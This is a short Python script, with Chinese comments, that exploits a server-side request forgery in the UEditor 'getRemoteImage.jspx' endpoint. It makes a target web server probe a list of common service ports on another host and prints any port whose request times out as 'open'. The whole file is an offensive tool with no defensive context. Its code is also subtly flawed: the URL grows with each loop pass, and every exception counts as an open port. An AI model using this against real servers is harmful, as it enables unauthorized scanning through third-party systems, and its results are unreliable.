# -*- coding-utf-8 -*-

import requests

def portscan(url,rurl):
    # 测试端口，可以根据需求添加或更改
    ports = [21,22,23,25,80,443,445,873,1080,1099,1090,1521,3306,6379,27017]

    for port in ports:
        try:
            url = url + '/ueditor/getRemoteImage.jspx?upfile=' + rurl + ':{port}'.format(port=port)
            response = requests.get(url, timeout=6)
        except:
            # 超过6秒就认为端口是开放的，因为如果端口不开放目标肯定会发一个TCP REST，连接会立马中断，说明漏洞存在
            print('[+]{port} is open'.format(port=port))

if __name__ == '__main__':
    # portscan('target site','hacker test site')
    portscan('http://www.target.com', 'www.google.com')
